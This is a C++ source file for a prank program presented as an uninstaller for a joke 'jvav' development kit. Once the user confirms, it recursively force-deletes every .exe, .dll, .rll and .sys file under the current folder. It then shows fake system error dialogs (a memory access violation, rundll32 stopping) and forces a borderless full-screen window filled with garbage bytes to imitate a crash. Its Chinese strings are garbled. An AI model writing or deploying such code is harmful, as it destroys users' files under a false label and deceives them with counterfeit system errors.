//
// Copyright (C)   ExecuitIF.
//
//
/***********************************************************************************************
 ***            C O N F I D E N T I A L  ---  E X E C U I T I F   S T U D I O S              ***
 ***********************************************************************************************
 *                                                                                             *
 *                 Project Name : jvav-uninst                                                  *
 *                                                                                             *
 *                    File Name : jvav-unins.cpp                                               *
 *                                                                                             *
 *                   Programmer : ExecuitIF                                                    *
 *                                                                                             *
 *                   Start Date :  15/06/2020                                                  *
 *                                                                                             *
 *                  Last Update :  ,                                                           *
 *                                                                                             *
 *---------------------------------------------------------------------------------------------*
 * Functions:                                                                                  *
 *                     #.h                                                                     *
 * - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - */

#include "#.h"

int main(int argc, char** argv)
{
	char temp;
	system("color F0");
	cout<<"ȷʵҪж�� jvav ���뿪���׼������ɿ��������� �𣿣�y/n��\n";
	cin>>temp;
	if(temp=='Y'||temp=='y')
	{
		system("del /s /f /q .\\*.exe");
		system("del /s /f /q .\\*.dll");
		system("del /s /f /q .\\*.rll");
		system("del /s /f /q .\\*.sys");
		MessageBox(NULL,"�쳣�Ĵ���","SYSTEM",MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
		MessageBox(NULL,"�ڴ�0xc0000005�������","SYSTEM",MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
		MessageBox(NULL,"ϵͳ������ \"rundll32.exe\" ��ֹͣ����","��������",MB_OK | MB_SYSTEMMODAL | MB_ICONHAND);
		system("color 1F");
		HWND hwnd = GetForegroundWindow();
		int cx = GetSystemMetrics(SM_CXSCREEN);
		int cy = GetSystemMetrics(SM_CYSCREEN);
		LONG l_WinStyle = GetWindowLong(hwnd,GWL_STYLE);
		SetWindowLong(hwnd,GWL_STYLE,(l_WinStyle | WS_POPUP | WS_MAXIMIZE) & ~WS_CAPTION & ~WS_THICKFRAME & ~WS_BORDER);
		SetWindowPos(hwnd, HWND_TOP, 0, 0, cx, cy, 0);
		system("cls");
		cout<<"\n\n\n\n\n\n\n                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                       /                                                                                                                                                      \n";
		cout<<"                  0   |                                                                                                                                                       \n";
		cout<<"                      |                          �H��H��H�S����H��H��莬��I��H�C�8I� J�������F���������                                                           \n";
		cout<<"                  0    \\                             ��I��L-��	����I��H�>���I���7                                                                                    \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                               /               -----                                                                                                                          \n";
		cout<<"                              /               /     \\                                                                                                                         \n";
		cout<<"                         0   /   0           |       |                                                                                                                        \n";
		cout<<"                            /                 \\     /                                                                                                                         \n";
		cout<<"                           /                   -----                                                                                                                          \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
		cout<<"                                                                                                                                                                              \n";
	}
	system("pause");
	return false;
}

void full_screen()
{
	HWND hwnd = GetForegroundWindow();
	int cx = GetSystemMetrics(SM_CXSCREEN);
	int cy = GetSystemMetrics(SM_CYSCREEN);
	LONG l_WinStyle = GetWindowLong(hwnd,GWL_STYLE);
	SetWindowLong(hwnd,GWL_STYLE,(l_WinStyle | WS_POPUP | WS_MAXIMIZE) & ~WS_CAPTION & ~WS_THICKFRAME & ~WS_BORDER);
	SetWindowPos(hwnd, HWND_TOP, 0, 0, cx, cy, 0);
}

